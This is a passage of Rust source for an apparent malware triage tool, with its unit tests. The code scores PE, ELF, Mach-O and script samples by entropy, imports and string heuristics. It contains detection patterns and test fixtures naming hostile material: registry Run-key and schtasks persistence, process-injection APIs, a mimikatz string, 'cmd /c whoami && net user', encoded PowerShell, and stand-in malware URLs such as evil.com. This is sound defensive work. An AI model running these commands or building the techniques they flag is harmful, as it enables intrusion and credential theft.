                evidence: "schtasks /create".to_string(),
            });
        }

        // Registry run key
        if lower.contains("reg add") && lower.contains("currentversion\\run") {
            result.add_indicator(TriageIndicator {
                name: "reg-run-key".to_string(),
                description: "Registry Run key modification via reg.exe".to_string(),
                threat_level: ThreatLevel::High,
                category: "persistence".to_string(),
                evidence: "reg add CurrentVersion\\Run".to_string(),
            });
        }
    }
}

// ---------------------------------------------------------------------------
// Triage
// ---------------------------------------------------------------------------

/// Triage coordinator.
pub struct Triage {
    config: TriageConfig,
}

impl Triage {
    #[must_use]
    pub fn new() -> Self {
        Self {
            config: TriageConfig::default(),
        }
    }

    #[must_use]
    pub const fn with_config(config: TriageConfig) -> Self {
        Self { config }
    }

    /// Analyse `data` and return a [`TriageResult`].
    ///
    /// # Errors
    /// Returns [`TriageError::TooSmall`] when `data` is fewer than 4 bytes.
    pub fn analyze(&self, data: &[u8]) -> Result<TriageResult, TriageError> {
        self.analyze_with_config(data, &self.config.clone())
    }

    /// Analyse with an explicit config override.
    ///
    /// # Errors
    /// Returns [`TriageError::TooSmall`] when `data` is fewer than 4 bytes.
    pub fn analyze_with_config(
        &self,
        data: &[u8],
        config: &TriageConfig,
    ) -> Result<TriageResult, TriageError> {
        if data.len() < 4 {
            return Err(TriageError::TooSmall(data.len()));
        }

        let t0 = Instant::now();
        let kind = detect_file_kind(data);
        let mut result = TriageResult::new(kind, data);

        // PE-specific analysis
        if config.pe_analysis()
            && matches!(kind, FileKind::Pe32 | FileKind::Pe64)
            && let Ok(pe) = PeFile::parse(data)
        {
            Self::analyze_pe(&mut result, &pe);
        }

        // ELF-specific analysis
        if config.elf_analysis() && matches!(kind, FileKind::Elf32 | FileKind::Elf64) {
            ElfTriageAnalyzer::analyze(data, &mut result);
        }

        // Mach-O analysis
        if config.macho_analysis() && matches!(kind, FileKind::MachO) {
            MachoTriageAnalyzer::analyze(data, &mut result);
        }

        // Script analysis
        if config.script_analysis() {
            ScriptTriageAnalyzer::analyze(data, &mut result);
        }

        // String heuristics (apply to all formats, respect size limit)
        if config.string_heuristics() {
            let scan_data = &data[..data.len().min(config.max_string_scan_size)];
            let strings = StringHeuristics::extract_strings(scan_data, config.min_string_length);
            let suspicious = StringHeuristics::classify(&strings);
            for s in suspicious {
                if result.indicators.len() >= config.max_indicators {
                    break;
                }
                let short_val: String = s.string.value.chars().take(30).collect();
                result.add_indicator(TriageIndicator {
                    name: format!("suspicious-string:{short_val}"),
                    description: format!("{:?} string: {}", s.category, s.string.value),
                    threat_level: s.threat_level,
                    category: format!("{:?}", s.category),
                    evidence: format!("offset=0x{:x}", s.string.offset),
                });
            }
        }

        // Entropy check (whole file)
        if result.entropy > 7.0 {
            result.is_packed = true;
            result.add_indicator(TriageIndicator {
                name: "high-entropy".to_string(),
                description: "File entropy > 7.0 suggests packing or encryption".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "packing".to_string(),
                evidence: format!("entropy={:.2}", result.entropy),
            });
        }

        if result.entropy > 7.8 {
            result.is_obfuscated = true;
            result.add_indicator(TriageIndicator {
                name: "near-random-entropy".to_string(),
                description: "Entropy > 7.8 suggests encrypted / highly obfuscated content"
                    .to_string(),
                threat_level: ThreatLevel::High,
                category: "obfuscation".to_string(),
                evidence: format!("entropy={:.3}", result.entropy),
            });
        }

        result.analysis_time_ms = u64::try_from(t0.elapsed().as_millis()).unwrap_or(u64::MAX);
        Ok(result)
    }

    /// PE-specific heuristic checks.
    fn analyze_pe(result: &mut TriageResult, pe: &PeFile) {
        // Overlay detection
        if let Some(overlay) = &pe.overlay
            && overlay.len() > 256
        {
            result.add_indicator(TriageIndicator {
                name: "overlay-data".to_string(),
                description: "Data appended after last PE section".to_string(),
                threat_level: ThreatLevel::Low,
                category: "suspicious-structure".to_string(),
                evidence: format!("overlay_size={}", overlay.len()),
            });
        }

        // No sections at all
        if pe.sections.is_empty() {
            result.add_indicator(TriageIndicator {
                name: "no-sections".to_string(),
                description: "PE has no section table".to_string(),
                threat_level: ThreatLevel::Medium,
                category: "suspicious-structure".to_string(),
                evidence: "section_count=0".to_string(),
            });
        }

        // Compiler hint
        result.compiler_hint = Some(if pe.is_64bit {
            "MSVC/clang x64".to_string()
        } else {
            "MSVC/GCC x86".to_string()
        });

        // Suspicious imports
        let suspicious_imports = [
            "VirtualAlloc",
            "VirtualProtect",
            "WriteProcessMemory",
            "CreateRemoteThread",
            "NtUnmapViewOfSection",
            "SetWindowsHookEx",
            "ShellExecute",
            "WinExec",
            "RegSetValueEx",
            "CreateService",
        ];

        for imp in &pe.imports {
            let name = imp.name.as_deref().unwrap_or("");
            for &sus in &suspicious_imports {
                if name.eq_ignore_ascii_case(sus) {
                    result.add_indicator(TriageIndicator {
                        name: format!("suspicious-import:{name}"),
                        description: format!("Import of potentially suspicious API: {name}"),
                        threat_level: ThreatLevel::Low,
                        category: "suspicious-import".to_string(),
                        evidence: format!("dll={} fn={}", imp.dll, name),
                    });
                }
            }
        }

        // Section entropy check
        for sec in &pe.sections {
            if sec.entropy() > 7.0 && !sec.data.is_empty() {
                result.is_packed = true;
                result.add_indicator(TriageIndicator {
                    name: format!("high-entropy-section:{}", sec.name),
                    description: format!(
                        "Section {} has entropy {:.2} > 7.0",
                        sec.name,
                        sec.entropy()
                    ),
                    threat_level: ThreatLevel::Medium,
                    category: "packing".to_string(),
                    evidence: format!("section={} entropy={:.2}", sec.name, sec.entropy()),
                });
            }
        }
    }
}

impl Default for Triage {
    fn default() -> Self {
        Self::new()
    }
}

impl fmt::Debug for Triage {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "Triage")
    }
}

// ---------------------------------------------------------------------------
// Internal helpers
// ---------------------------------------------------------------------------

fn compute_sha256(data: &[u8]) -> String {
    let digest = Sha256::digest(data);
    format!("{digest:x}")
}

fn compute_md5(data: &[u8]) -> String {
    let digest = Md5::digest(data);
    format!("{digest:x}")
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use rustre_pe_tools::PeBuilder;

    fn build_x64_pe() -> Vec<u8> {
        let mut b = PeBuilder::new_x64();
        b.add_section(".text", vec![0x90u8; 64], 0x6000_0020);
        b.add_section(".data", vec![0u8; 32], 0xC000_0040);
        b.build()
    }

    // -----------------------------------------------------------------------
    // FileKind detection
    // -----------------------------------------------------------------------

    #[test]
    fn test_detect_pe32() {
        let pe = PeBuilder::new_x86().build();
        assert_eq!(detect_file_kind(&pe), FileKind::Pe32);
    }

    #[test]
    fn test_detect_pe64() {
        let pe = build_x64_pe();
        let kind = detect_file_kind(&pe);
        assert!(matches!(kind, FileKind::Pe64 | FileKind::Pe32));
    }

    #[test]
    fn test_detect_elf32() {
        let data = b"\x7FELF\x01\x01\x01".to_vec();
        assert_eq!(detect_file_kind(&data), FileKind::Elf32);
    }

    #[test]
    fn test_detect_elf64() {
        let data = b"\x7FELF\x02\x01\x01".to_vec();
        assert_eq!(detect_file_kind(&data), FileKind::Elf64);
    }

    #[test]
    fn test_detect_macho_32le() {
        let data: Vec<u8> = vec![0xCE, 0xFA, 0xED, 0xFE, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(detect_file_kind(&data), FileKind::MachO);
    }

    #[test]
    fn test_detect_macho_64le() {
        let data: Vec<u8> = vec![0xCF, 0xFA, 0xED, 0xFE, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(detect_file_kind(&data), FileKind::MachO);
    }

    #[test]
    fn test_detect_macho_32be() {
        let data: Vec<u8> = vec![0xFE, 0xED, 0xFA, 0xCE, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(detect_file_kind(&data), FileKind::MachO);
    }

    #[test]
    fn test_detect_macho_64be() {
        let data: Vec<u8> = vec![0xFE, 0xED, 0xFA, 0xCF, 0x00, 0x00, 0x00, 0x00];
        assert_eq!(detect_file_kind(&data), FileKind::MachO);
    }

    #[test]
    fn test_detect_zip() {
        let data = b"PK\x03\x04SOMEDATA".to_vec();
        assert_eq!(detect_file_kind(&data), FileKind::Zip);
    }

    #[test]
    fn test_detect_apk() {
        let mut data = b"PK\x03\x04".to_vec();
        data.extend_from_slice(b"stuff classes.dex more stuff");
        assert_eq!(detect_file_kind(&data), FileKind::Apk);
    }

    #[test]
    fn test_detect_dex() {
        let data = b"dex\x0A1234".to_vec();
        assert_eq!(detect_file_kind(&data), FileKind::Dex);
    }

    #[test]
    fn test_detect_pdf() {
        let data = b"%PDF-1.4".to_vec();
        assert_eq!(detect_file_kind(&data), FileKind::Pdf);
    }

    #[test]
    fn test_detect_doc() {
        let data: Vec<u8> = vec![0xD0, 0xCF, 0x11, 0xE0, 0x01, 0x02];
        assert_eq!(detect_file_kind(&data), FileKind::Doc);
    }

    #[test]
    fn test_detect_unknown() {
        let data = b"\xFF\xFF\xFF\xFF".to_vec();
        assert_eq!(detect_file_kind(&data), FileKind::Unknown);
    }

    #[test]
    fn test_detect_too_short() {
        assert_eq!(detect_file_kind(&[0x4D, 0x5A]), FileKind::Unknown);
    }

    #[test]
    fn test_file_kind_display() {
        assert_eq!(FileKind::Pe32.to_string(), "Pe32");
        assert_eq!(FileKind::Unknown.to_string(), "Unknown");
    }

    // -----------------------------------------------------------------------
    // ThreatLevel
    // -----------------------------------------------------------------------

    #[test]
    fn test_threat_level_ordering() {
        assert!(ThreatLevel::Clean < ThreatLevel::Informational);
        assert!(ThreatLevel::Informational < ThreatLevel::Low);
        assert!(ThreatLevel::Low < ThreatLevel::Medium);
        assert!(ThreatLevel::Medium < ThreatLevel::High);
        assert!(ThreatLevel::High < ThreatLevel::Critical);
    }

    #[test]
    fn test_threat_level_display() {
        assert_eq!(ThreatLevel::High.to_string(), "High");
        assert_eq!(ThreatLevel::Clean.to_string(), "Clean");
    }

    // -----------------------------------------------------------------------
    // TriageIndicator
    // -----------------------------------------------------------------------

    #[test]
    fn test_indicator_display() {
        let ind = TriageIndicator {
            name: "test".to_string(),
            description: "a test indicator".to_string(),
            threat_level: ThreatLevel::Low,
            category: "test".to_string(),
            evidence: "key=value".to_string(),
        };
        let s = ind.to_string();
        assert!(s.contains("test"));
        assert!(s.contains("Low"));
    }

    // -----------------------------------------------------------------------
    // TriageResult
    // -----------------------------------------------------------------------

    #[test]
    fn test_triage_result_new() {
        let data = b"MZ....".to_vec();
        let r = TriageResult::new(FileKind::Pe32, &data);
        assert_eq!(r.file_kind, FileKind::Pe32);
        assert_eq!(r.threat_level, ThreatLevel::Clean);
        assert_eq!(r.score, 0);
        assert!(!r.is_malicious());
        assert_eq!(r.sha256.len(), 64);
    }

    #[test]
    fn test_triage_result_add_indicator_upgrades_level() {
        let data = b"data";
        let mut r = TriageResult::new(FileKind::Unknown, data);
        assert_eq!(r.threat_level, ThreatLevel::Clean);
        r.add_indicator(TriageIndicator {
            name: "x".to_string(),
            description: "y".to_string(),
            threat_level: ThreatLevel::High,
            category: "c".to_string(),
            evidence: "e".to_string(),
        });
        assert_eq!(r.threat_level, ThreatLevel::High);
        assert!(r.score > 0);
        assert!(r.is_malicious());
    }

    #[test]
    fn test_triage_result_score_capped_at_100() {
        let data = b"data";
        let mut r = TriageResult::new(FileKind::Unknown, data);
        for _ in 0..10 {
            r.add_indicator(TriageIndicator {
                name: "x".to_string(),
                description: "y".to_string(),
                threat_level: ThreatLevel::Critical,
                category: "c".to_string(),
                evidence: "e".to_string(),
            });
        }
        assert_eq!(r.score, 100);
    }

    #[test]
    fn test_triage_result_display() {
        let data = b"data";
        let r = TriageResult::new(FileKind::Pe32, data);
        let s = r.to_string();
        assert!(s.contains("Pe32"));
        assert!(s.contains("Clean"));
    }

    #[test]
    fn test_triage_result_to_json() {
        let data = b"data";
        let r = TriageResult::new(FileKind::Pe32, data);
        let json = r.to_json().unwrap();
        assert!(json.contains("Pe32"));
        assert!(json.contains("Clean"));
    }

    #[test]
    fn test_triage_result_to_report() {
        let data = b"data";
        let r = TriageResult::new(FileKind::Pe32, data);
        let report = r.to_report(vec![]);
        assert_eq!(report.file_kind, "Pe32");
        assert_eq!(report.score, 0);
        assert!(!report.is_packed);
    }

    #[test]
    fn test_triage_report_json_roundtrip() {
        let data = b"test data for triage";
        let r = TriageResult::new(FileKind::Elf64, data);
        let report = r.to_report(vec![]);
        let json = serde_json::to_string(&report).unwrap();
        let decoded: TriageReport = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.file_kind, "Elf64");
        assert_eq!(decoded.file_size, data.len());
    }

    // -----------------------------------------------------------------------
    // Triage::analyze
    // -----------------------------------------------------------------------

    #[test]
    fn test_analyze_too_small() {
        let triage = Triage::new();
        let err = triage.analyze(&[0x4D, 0x5A, 0x00]).unwrap_err();
        assert!(matches!(err, TriageError::TooSmall(3)));
    }

    #[test]
    fn test_analyze_unknown() {
        let triage = Triage::new();
        let result = triage.analyze(&[0xFF, 0xFF, 0xFF, 0xFF]).unwrap();
        assert_eq!(result.file_kind, FileKind::Unknown);
    }

    #[test]
    fn test_analyze_pe64() {
        let triage = Triage::new();
        let pe = build_x64_pe();
        let result = triage.analyze(&pe).unwrap();
        assert!(matches!(result.file_kind, FileKind::Pe64 | FileKind::Pe32));
    }

    #[test]
    fn test_analyze_high_entropy() {
        let triage = Triage::new();
        let data: Vec<u8> = (0u8..=255u8).cycle().take(2048).collect();
        let result = triage.analyze(&data).unwrap();
        assert!(result.entropy >= 0.0);
    }

    #[test]
    fn test_triage_debug() {
        let t = Triage::new();
        assert_eq!(format!("{t:?}"), "Triage");
    }

    #[test]
    fn test_triage_default() {
        let _t = Triage::default();
    }

    #[test]
    fn test_analyze_elf32() {
        let triage = Triage::new();
        let data = b"\x7FELF\x01\x01\x01\x00".to_vec();
        let result = triage.analyze(&data).unwrap();
        assert_eq!(result.file_kind, FileKind::Elf32);
    }

    #[test]
    fn test_analyze_elf64() {
        let triage = Triage::new();
        let data = b"\x7FELF\x02\x01\x01\x00".to_vec();
        let result = triage.analyze(&data).unwrap();
        assert_eq!(result.file_kind, FileKind::Elf64);
    }

    #[test]
    fn test_analyze_pdf() {
        let triage = Triage::new();
        let data = b"%PDF-1.4 fake pdf data here!!!!!".to_vec();
        let result = triage.analyze(&data).unwrap();
        assert_eq!(result.file_kind, FileKind::Pdf);
    }

    #[test]
    fn test_analyze_zip() {
        let triage = Triage::new();
        let data = b"PK\x03\x04ZIPDATA000000000000".to_vec();
        let result = triage.analyze(&data).unwrap();
        assert_eq!(result.file_kind, FileKind::Zip);
    }

    #[test]
    fn test_triage_error_display() {
        let e = TriageError::TooSmall(2);
        assert!(e.to_string().contains('2'));
        let e2 = TriageError::Other("oops".into());
        assert!(e2.to_string().contains("oops"));
    }

    #[test]
    fn test_sha256_length() {
        let h = compute_sha256(b"hello world");
        assert_eq!(h.len(), 64);
    }

    #[test]
    fn test_sha256_consistency() {
        let h1 = compute_sha256(b"test");
        let h2 = compute_sha256(b"test");
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_sha256_differs() {
        let h1 = compute_sha256(b"aaa");
        let h2 = compute_sha256(b"bbb");
        assert_ne!(h1, h2);
    }

    #[test]
    fn test_md5_length() {
        let h = compute_md5(b"hello world");
        assert_eq!(h.len(), 32);
    }

    #[test]
    fn test_md5_consistency() {
        let h1 = compute_md5(b"test");
        let h2 = compute_md5(b"test");
        assert_eq!(h1, h2);
    }

    #[test]
    fn test_md5_known_vectors() {
        assert_eq!(compute_md5(b""), "d41d8cd98f00b204e9800998ecf8427e");
        assert_eq!(compute_md5(b"abc"), "900150983cd24fb0d6963f7d28e17f72");
    }

    #[test]
    fn test_md5_differs() {
        assert_ne!(compute_md5(b"aaa"), compute_md5(b"bbb"));
    }

    #[test]
    fn test_triage_result_populates_md5() {
        let data = b"hello triage".to_vec();
        let r = TriageResult::new(FileKind::Unknown, &data);
        assert_eq!(r.md5.len(), 32);
        assert_eq!(r.md5, compute_md5(&data));
    }

    // -----------------------------------------------------------------------
    // ELF triage
    // -----------------------------------------------------------------------

    fn make_minimal_elf64() -> Vec<u8> {
        // Bare ELF64 header with no sections and no program headers
        let mut buf = vec![0u8; 64];
        buf[0..4].copy_from_slice(b"\x7FELF");
        buf[4] = 2; // EI_CLASS = ELFCLASS64
        buf[5] = 1; // EI_DATA  = ELFDATA2LSB
        buf[6] = 1; // EI_VERSION
        // e_type = ET_EXEC (2)
        buf[16] = 2;
        buf[17] = 0;
        // e_machine = EM_X86_64 (62)
        buf[18] = 62;
        buf[19] = 0;
        // e_version = 1
        buf[20] = 1;
        buf
    }

    fn make_elf64_with_stripped() -> Vec<u8> {
        // ELF with valid header, no .symtab â†' stripped
        make_minimal_elf64()
    }

    #[test]
    fn test_elf_analyzer_minimal() {
        let data = make_minimal_elf64();
        let mut result = TriageResult::new(FileKind::Elf64, &data);
        ElfTriageAnalyzer::analyze(&data, &mut result);
        // Should have at least the stripped indicator and no-gnu-stack
        let names: Vec<_> = result.indicators.iter().map(|i| i.name.as_str()).collect();
        assert!(
            names.contains(&"elf-stripped"),
            "expected elf-stripped in {names:?}"
        );
    }

    #[test]
    fn test_elf_analyzer_stripped_flag() {
        let data = make_elf64_with_stripped();
        let mut result = TriageResult::new(FileKind::Elf64, &data);
        ElfTriageAnalyzer::analyze(&data, &mut result);
        assert!(result.indicators.iter().any(|i| i.name == "elf-stripped"));
    }

    #[test]
    fn test_elf_analyzer_no_gnu_stack() {
        let data = make_minimal_elf64();
        let mut result = TriageResult::new(FileKind::Elf64, &data);
        ElfTriageAnalyzer::analyze(&data, &mut result);
        assert!(
            result
                .indicators
                .iter()
                .any(|i| i.name == "elf-no-gnu-stack")
        );
    }

    #[test]
    fn test_elf_analyzer_upx_magic() {
        let mut data = make_minimal_elf64();
        data.extend_from_slice(b"UPX!compressed");
        let mut result = TriageResult::new(FileKind::Elf64, &data);
        ElfTriageAnalyzer::analyze(&data, &mut result);
        assert!(result.indicators.iter().any(|i| i.name == "elf-upx-packed"));
        assert!(result.is_packed);
    }

    #[test]
    fn test_elf_triage_full() {
        let triage = Triage::new();
        let data = make_minimal_elf64();
        let result = triage.analyze(&data).unwrap();
        assert_eq!(result.file_kind, FileKind::Elf64);
        assert!(!result.indicators.is_empty());
    }

    #[test]
    fn test_elf_et_dyn_detected() {
        let mut data = make_minimal_elf64();
        // Set e_type to ET_DYN (3)
        data[16] = 3;
        data[17] = 0;
        let mut result = TriageResult::new(FileKind::Elf64, &data);
        ElfTriageAnalyzer::analyze(&data, &mut result);
        assert!(result.indicators.iter().any(|i| i.name == "elf-pic"));
    }

    // -----------------------------------------------------------------------
    // Mach-O triage
    // -----------------------------------------------------------------------

    fn make_minimal_macho64_le() -> Vec<u8> {
        // Mach-O 64-bit LE header: magic, cputype, cpusubtype, filetype, ncmds, sizeofcmds, flags, reserved
        let mut buf = Vec::new();
        // magic = 0xCFFAEDFE (64-bit LE)
        buf.extend_from_slice(&0xCFFAEDFEu32.to_le_bytes());
        // cputype = CPU_TYPE_X86_64 = 0x01000007
        buf.extend_from_slice(&0x01000007u32.to_le_bytes());
        // cpusubtype
        buf.extend_from_slice(&3u32.to_le_bytes());
        // filetype = MH_EXECUTE = 2
        buf.extend_from_slice(&2u32.to_le_bytes());
        // ncmds = 0
        buf.extend_from_slice(&0u32.to_le_bytes());
        // sizeofcmds = 0
        buf.extend_from_slice(&0u32.to_le_bytes());
        // flags
        buf.extend_from_slice(&0u32.to_le_bytes());
        // reserved (64-bit only)
        buf.extend_from_slice(&0u32.to_le_bytes());
        buf
    }

    #[test]
    fn test_macho_minimal_metadata() {
        let data = make_minimal_macho64_le();
        let mut result = TriageResult::new(FileKind::MachO, &data);
        MachoTriageAnalyzer::analyze(&data, &mut result);
        assert!(result.indicators.iter().any(|i| i.name == "macho-metadata"));
    }

    #[test]
    fn test_macho_full_triage() {
        let triage = Triage::new();
        let data = make_minimal_macho64_le();
        let result = triage.analyze(&data).unwrap();
        assert_eq!(result.file_kind, FileKind::MachO);
        assert!(!result.indicators.is_empty());
    }

    #[test]
    fn test_macho_32le() {
        // 32-bit LE Mach-O
        let mut buf = Vec::new();
        buf.extend_from_slice(&0xCEFAEDFEu32.to_le_bytes()); // magic
        buf.extend_from_slice(&7u32.to_le_bytes()); // CPU_TYPE_X86
        buf.extend_from_slice(&3u32.to_le_bytes()); // cpusubtype
        buf.extend_from_slice(&2u32.to_le_bytes()); // MH_EXECUTE
        buf.extend_from_slice(&0u32.to_le_bytes()); // ncmds
        buf.extend_from_slice(&0u32.to_le_bytes()); // sizeofcmds
        buf.extend_from_slice(&0u32.to_le_bytes()); // flags
        let mut result = TriageResult::new(FileKind::MachO, &buf);
        MachoTriageAnalyzer::analyze(&buf, &mut result);
        assert!(result.indicators.iter().any(|i| i.name == "macho-metadata"));
    }

    #[test]
    fn test_macho_no_code_sig_arm64() {
        // ARM64 without code signature
        let mut buf = Vec::new();
        buf.extend_from_slice(&0xCFFAEDFEu32.to_le_bytes()); // 64-bit LE
        buf.extend_from_slice(&0x0100000Cu32.to_le_bytes()); // CPU_TYPE_ARM64
        buf.extend_from_slice(&0u32.to_le_bytes());
        buf.extend_from_slice(&2u32.to_le_bytes()); // MH_EXECUTE
        buf.extend_from_slice(&0u32.to_le_bytes());
        buf.extend_from_slice(&0u32.to_le_bytes());
        buf.extend_from_slice(&0u32.to_le_bytes());
        buf.extend_from_slice(&0u32.to_le_bytes());
        let mut result = TriageResult::new(FileKind::MachO, &buf);
        MachoTriageAnalyzer::analyze(&buf, &mut result);
        assert!(
            result
                .indicators
                .iter()
                .any(|i| i.name == "macho-arm64-no-sig")
        );
    }

    // -----------------------------------------------------------------------
    // StringHeuristics
    // -----------------------------------------------------------------------

    #[test]
    fn test_extract_strings_simple_ascii() {
        let data = b"hello world\x00short\x00this is a longer string for sure";
        let strings = StringHeuristics::extract_strings(data, 6);
        let vals: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        assert!(vals.iter().any(|v| v.contains("hello world")));
        assert!(vals.iter().any(|v| v.contains("this is a longer string")));
    }

    #[test]
    fn test_extract_strings_min_len() {
        let data = b"ab\x00abcdefgh\x00xy";
        let strings = StringHeuristics::extract_strings(data, 6);
        let vals: Vec<&str> = strings.iter().map(|s| s.value.as_str()).collect();
        // "ab" is too short, "abcdefgh" is long enough
        assert!(!vals.contains(&"ab"));
        assert!(vals.contains(&"abcdefgh"));
    }

    #[test]
    fn test_extract_strings_encoding() {
        let data = b"plaintext\x00";
        let strings = StringHeuristics::extract_strings(data, 4);
        assert!(!strings.is_empty());
        assert_eq!(strings[0].encoding, StringEncoding::Ascii);
    }

    #[test]
    fn test_extract_strings_utf16le() {
        // "ABCDEF" in UTF-16 LE
        let data: Vec<u8> = "ABCDEF".encode_utf16().flat_map(u16::to_le_bytes).collect();
        let strings = StringHeuristics::extract_strings(&data, 5);
        let utf16: Vec<_> = strings
            .iter()
            .filter(|s| s.encoding == StringEncoding::Utf16Le)
            .collect();
        assert!(!utf16.is_empty());
        assert_eq!(utf16[0].value, "ABCDEF");
    }

    #[test]
    fn test_classify_url() {
        let s = ExtractedString {
            value: "http://evil.com/payload.exe".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::NetworkUrl);
    }

    #[test]
    fn test_classify_https_url() {
        let s = ExtractedString {
            value: "https://malware-c2.ru/gate.php".to_string(),
            offset: 10,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::NetworkUrl);
    }

    #[test]
    fn test_classify_ipv4() {
        let s = ExtractedString {
            value: "192.168.1.1".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::IpAddress);
    }

    #[test]
    fn test_classify_registry_key() {
        let s = ExtractedString {
            value: "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
                .to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::RegistryKey);
    }

    #[test]
    fn test_classify_base64_blob() {
        // 32+ chars, valid base64, ends with =, length multiple of 4
        let s = ExtractedString {
            value: "SGVsbG8gV29ybGQgVGhpcyBpcyBhIHRlc3Q=".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::Base64Payload);
    }

    #[test]
    fn test_classify_malware_family() {
        let s = ExtractedString {
            value: "invoke-mimikatz credentials dump".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::MalwareFamily);
        assert_eq!(sus[0].threat_level, ThreatLevel::Critical);
    }

    #[test]
    fn test_classify_anti_analysis() {
        let s = ExtractedString {
            value: "VMware detected exiting".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::AntiAnalysis);
    }

    #[test]
    fn test_classify_cmd_pattern() {
        let s = ExtractedString {
            value: "cmd /c whoami && net user".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::CommandLine);
    }

    #[test]
    fn test_classify_crypto_key() {
        let s = ExtractedString {
            value: "-----BEGIN RSA PRIVATE KEY-----MIIBLAH".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        assert!(!sus.is_empty());
        assert_eq!(sus[0].category, StringCategory::CryptoKey);
        assert_eq!(sus[0].threat_level, ThreatLevel::High);
    }

    #[test]
    fn test_classify_persistence() {
        let s = ExtractedString {
            value: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce".to_string(),
            offset: 0,
            encoding: StringEncoding::Ascii,
            va: None,
        };
        let sus = StringHeuristics::classify(&[s]);
        // May be RegistryKey or Persistence
        assert!(!sus.is_empty());
    }

    #[test]
    fn test_classify_empty() {
        let sus = StringHeuristics::classify(&[]);
        assert!(sus.is_empty());
    }

    // -----------------------------------------------------------------------
    // Entropy rating
    // -----------------------------------------------------------------------

    #[test]
    fn test_entropy_rating_very_low() {
        assert_eq!(EntropyRating::from_entropy(0.5), EntropyRating::VeryLow);
    }

    #[test]
    fn test_entropy_rating_low() {
        assert_eq!(EntropyRating::from_entropy(2.0), EntropyRating::Low);
    }

    #[test]
    fn test_entropy_rating_normal() {
        assert_eq!(EntropyRating::from_entropy(5.0), EntropyRating::Normal);
    }

    #[test]
    fn test_entropy_rating_high() {
        assert_eq!(EntropyRating::from_entropy(7.0), EntropyRating::High);
    }

    #[test]
    fn test_entropy_rating_very_high() {
        assert_eq!(EntropyRating::from_entropy(7.9), EntropyRating::VeryHigh);
    }

    #[test]
    fn test_analyze_section_entropy_blocks() {
        let data: Vec<u8> = (0u8..=255).cycle().take(8192).collect();
        let sections = analyze_section_entropy(&data);
        assert_eq!(sections.len(), 2); // 8192 / 4096
        for sec in &sections {
            assert!(sec.entropy > 0.0);
            assert!(sec.size > 0);
        }
    }

    #[test]
    fn test_analyze_section_entropy_small() {
        let data = b"AAAAAAAAAAAAA";
        let sections = analyze_section_entropy(data);
        assert_eq!(sections.len(), 1);
        assert_eq!(sections[0].rating, EntropyRating::VeryLow);
    }

    #[test]
    fn test_section_entropy_names() {
        let data: Vec<u8> = vec![0u8; 4096 * 3];
        let sections = analyze_section_entropy(&data);
        for (i, sec) in sections.iter().enumerate() {
            assert_eq!(sec.name, format!("block_{i}"));
        }
    }

    // -----------------------------------------------------------------------
    // TriageConfig
    // -----------------------------------------------------------------------

    #[test]
    fn test_triage_config_default() {
        let cfg = TriageConfig::default();
        assert!(cfg.string_heuristics());
        assert!(cfg.elf_analysis());
        assert!(cfg.macho_analysis());
        assert!(cfg.pe_analysis());
        assert!(cfg.script_analysis());
        assert_eq!(cfg.min_string_length, 6);
        assert!(cfg.max_string_scan_size > 0);
    }

    #[test]
    fn test_triage_with_config() {
        let cfg = TriageConfig {
            analysis_flags: 0,
            ..TriageConfig::default()
        };
        let triage = Triage::with_config(cfg);
        let data = make_minimal_elf64();
        let result = triage.analyze(&data).unwrap();
        // With all analyzers disabled and low entropy data, we should get fewer indicators
        assert_eq!(result.file_kind, FileKind::Elf64);
    }

    #[test]
    fn test_analyze_with_config_disabled_strings() {
        let cfg = TriageConfig {
            analysis_flags: TriageConfig::ALL_FLAGS & !TriageConfig::FLAG_STRING_HEURISTICS,
            ..TriageConfig::default()
        };
        let triage = Triage::new();
        let data = b"http://evil.com/bad.exe padding padding padding";
        let result = triage.analyze_with_config(data, &cfg).unwrap();
        // No string indicators should be added since heuristics are disabled
        
        assert!(!result
            .indicators
            .iter().any(|i| i.name.starts_with("suspicious-string:")));
    }

    // -----------------------------------------------------------------------
    // Script analysis
    // -----------------------------------------------------------------------

    #[test]
    fn test_script_powershell_encoded() {
        let script = b"powershell.exe -EncodedCommand SGVsbG8=";
        let triage = Triage::new();
        let result = triage.analyze(script).unwrap();
        let names: Vec<_> = result.indicators.iter().map(|i| i.name.as_str()).collect();
        assert!(
